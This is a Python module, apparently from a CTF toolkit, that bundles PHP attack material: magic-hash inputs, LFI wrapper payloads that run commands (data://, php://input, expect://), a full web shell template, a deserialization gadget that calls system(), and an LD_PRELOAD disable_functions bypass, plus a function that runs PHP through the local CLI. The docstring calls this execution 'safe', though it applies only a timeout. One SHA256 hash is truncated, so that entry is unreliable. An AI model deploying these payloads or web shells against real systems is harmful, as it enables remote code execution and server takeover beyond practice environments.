from __future__ import annotations
"""PHP Sandbox Environment, CTF Gadget Builder, Magic Hashes, and LFI Wrapper Crafter."""
import asyncio
import os
import shutil
import tempfile
import time
from typing import Dict, List, Tuple, Any

# Common CTF Magic Hashes (0e... loose comparison '==' collisions)
PHP_MAGIC_HASHES: List[Dict[str, str]] = [
    {"algo": "MD5", "input": "240610708", "hash": "0e462097431906509019562988736854", "desc": "0e... matches 0 in loose '=='"},
    {"algo": "MD5", "input": "QNKCDZO", "hash": "0e830400451993494058024219903391", "desc": "Classic MD5 string collision"},
    {"algo": "MD5", "input": "aabg7XSs", "hash": "0e087386482136013740957780965295", "desc": "Alphanumeric string"},
    {"algo": "MD5", "input": "aabC9RqS", "hash": "0e041022496810258241595833357507", "desc": "Alphanumeric string"},
    {"algo": "SHA1", "input": "10932435112", "hash": "0e07766915004133176347055865026311692244", "desc": "SHA1 0e... collision"},
    {"algo": "SHA1", "input": "aaroZmOk", "hash": "0e66507019969427134894567496905872434354", "desc": "SHA1 alphanumeric collision"},
    {"algo": "SHA1", "input": "aaK1STeb", "hash": "0e76658526655756086962861961817469546997", "desc": "SHA1 alphanumeric collision"},
    {"algo": "SHA256", "input": "TyNOQUW", "hash": "0e12046708269809808234107785923879775650...", "desc": "SHA256 loose collision"},
]

# PHP LFI & Wrapper Templates
PHP_LFI_WRAPPERS: List[Dict[str, str]] = [
    {
        "name": "Base64 Filter Read (Bypass Extension Append)",
        "wrapper": "php://filter/convert.base64-encode/resource=index.php",
        "desc": "Reads PHP source code encoded as Base64 to prevent execution."
    },
    {
        "name": "Rot13 Filter Read",
        "wrapper": "php://filter/read=string.rot13/resource=index.php",
        "desc": "Reads PHP source code encoded with ROT13."
    },
    {
        "name": "Data Wrapper (Execute Base64 Payload)",
        "wrapper": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        "desc": "Executes '<?php system($_GET['cmd']); ?>' via data URI."
    },
    {
        "name": "Data Wrapper (Plaintext PHP)",
        "wrapper": "data://text/plain,<?php system('id'); ?>",
        "desc": "Direct PHP code execution via data URI if allow_url_include=On."
    },
    {
        "name": "PHP Input (POST Body as Code)",
        "wrapper": "php://input",
        "desc": "Executes raw POST body as PHP code (Send PHP code in POST payload)."
    },
    {
        "name": "PHP Filter Chaining (Oracle Resource Generator)",
        "wrapper": "php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode/resource=index.php",
        "desc": "Advanced iconv conversion chain for arbitrary string generation."
    },
    {
        "name": "Expect Wrapper (Direct Command Execution)",
        "wrapper": "expect://id",
        "desc": "Direct shell execution if expect extension is loaded."
    },
    {
        "name": "ZIP / Phar Wrapper",
        "wrapper": "zip://shell.zip#shell.php",
        "desc": "Extracts and executes script from inside a zip or phar archive."
    }
]

# Sample PHP CTF Exploit Scripts
PHP_STARTER_TEMPLATES: Dict[str, str] = {
    "Web Shell / Command Execution": (
        "<?php\n"
        "// CTF Interactive Command Executor\n"
        "if (isset($_REQUEST['cmd'])) {\n"
        "    echo \"<pre>\";\n"
        "    $cmd = $_REQUEST['cmd'];\n"
        "    if (function_exists('system')) {\n"
        "        system($cmd);\n"
        "    } elseif (function_exists('shell_exec')) {\n"
        "        echo shell_exec($cmd);\n"
        "    } elseif (function_exists('passthru')) {\n"
        "        passthru($cmd);\n"
        "    } elseif (function_exists('proc_open')) {\n"
        "        $p = proc_open($cmd, [1 => ['pipe', 'w']], $pipes);\n"
        "        echo stream_get_contents($pipes[1]);\n"
        "        fclose($pipes[1]);\n"
        "        proc_close($p);\n"
        "    }\n"
        "    echo \"</pre>\";\n"
        "}\n"
    ),
    "POP Chain & Object Serializer": (
        "<?php\n"
        "// Object Serializer for Insecure Deserialization (unserialize)\n"
        "class Exploit {\n"
        "    public $command = \"cat /flag* || cat /flag.txt\";\n"
        "    public function __wakeup() {\n"
        "        system($this->command);\n"
        "    }\n"
        "}\n\n"
        "$payload = new Exploit();\n"
        "$serialized = serialize($payload);\n"
        "echo \"Serialized Payload:\n\" . $serialized . \"\n\n\";\n"
        "echo \"URL Encoded:\n\" . urlencode($serialized) . \"\n\n\";\n"
        "echo \"Base64 Encoded:\n\" . base64_encode($serialized) . \"\n\";\n"
    ),
    "Loose Type / Hash Crack Generator": (
        "<?php\n"
        "// Fuzz for 0e... MD5 loose comparison collision\n"
        "$prefix = \"ctf_\";\n"
        "echo \"Searching for 0e... hash collision with prefix: {$prefix}\n\";\n"
        "for ($i = 0; $i < 1000000; $i++) {\n"
        "    $test = $prefix . $i;\n"
        "    $hash = md5($test);\n"
        "    if (substr($hash, 0, 2) === '0e' && is_numeric(substr($hash, 2))) {\n"
        "        echo \"[+] Match Found: {$test} => {$hash}\n\";\n"
        "        break;\n"
        "    }\n"
        "}\n"
    ),
    "Disabled Functions Bypass (LD_PRELOAD)": (
        "<?php\n"
        "// Bypass disable_functions using mail() + putenv(LD_PRELOAD)\n"
        "$cmd = \"cat /flag* > /tmp/flag.txt\";\n"
        "$so_path = \"/tmp/bypass.so\";\n"
        "putenv(\"EVIL_CMD=\" . $cmd);\n"
        "putenv(\"LD_PRELOAD=\" . $so_path);\n"
        "mail(\"a@127.0.0.1\", \"\", \"\", \"\");\n"
        "echo \"[+] Executed command via mail() trigger\n\";\n"
    )
}

async def execute_php_script(code: str, timeout: int = 10) -> Tuple[str, str, float, int]:
    """Executes a PHP script safely using the local PHP CLI binary with timeout safeguards."""
    php_path = shutil.which("php")
    if not php_path:
        return "", "[!] 'php' binary was not found on PATH. Please install PHP or add it to PATH.", 0.0, -1

    # Write code to a temporary file in a cross-platform manner
    t0 = time.time()
    tmp_fd, tmp_path = tempfile.mkstemp(suffix=".php", prefix="ctf_php_")
    try:
        with open(tmp_path, "w", encoding="utf-8") as f:
            f.write(code)
        os.close(tmp_fd)

        proc = await asyncio.create_subprocess_exec(
            php_path,
            tmp_path,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        try:
            stdout_b, stderr_b = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            elapsed_ms = (time.time() - t0) * 1000
            stdout = stdout_b.decode("utf-8", errors="replace")
            stderr = stderr_b.decode("utf-8", errors="replace")
            return stdout, stderr, elapsed_ms, proc.returncode or 0
        except asyncio.TimeoutError:
            try:
                proc.kill()
            except Exception:
                pass
            return "", f"PHP execution timed out after {timeout} seconds!", (time.time() - t0) * 1000, -1
    except Exception as e:
        return "", f"PHP execution error: {str(e)}", (time.time() - t0) * 1000, -1
    finally:
        try:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
        except Exception:
            pass
